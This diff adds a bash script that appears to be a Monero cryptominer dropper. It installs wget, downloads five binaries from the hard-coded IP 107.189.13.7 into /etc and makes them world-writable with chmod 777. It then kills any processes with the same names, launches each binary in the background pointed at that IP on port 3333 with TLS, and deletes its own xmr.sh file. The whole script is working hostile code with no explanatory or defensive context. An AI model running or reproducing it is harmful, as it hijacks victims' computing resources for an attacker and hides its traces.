@@ -1,0 +1,39 @@
+#!/bin/bash
+
+apt update
+apt install wget -y
+
+yum update
+yum install wget -y
+
+wget http://107.189.13.7/1 -O /etc/1
+wget http://107.189.13.7/2 -O /etc/2
+wget http://107.189.13.7/3 -O /etc/3
+wget http://107.189.13.7/4 -O /etc/4
+wget http://107.189.13.7/5 -O /etc/5
+
+chmod 777 /etc/1
+chmod 777 /etc/2
+chmod 777 /etc/3
+chmod 777 /etc/4
+chmod 777 /etc/5
+
+pkill 1
+pkill 2
+pkill 3
+pkill 4
+pkill 5
+
+string=$(uname -v | awk '{print $1}')
+
+/etc/1 -o 107.189.13.7:3333 -u 1 --tls -B
+/etc/2 -o 107.189.13.7:3333 -u 1 --tls -B
+/etc/3 -o 107.189.13.7:3333 -u 1 --tls -B
+/etc/4 -o 107.189.13.7:3333 -u 1 --tls -B
+/etc/5 -o 107.189.13.7:3333 -u 1 --tls -B
+
+rm xmr.sh -f
+rm xmr.sh* -f
+
+
+
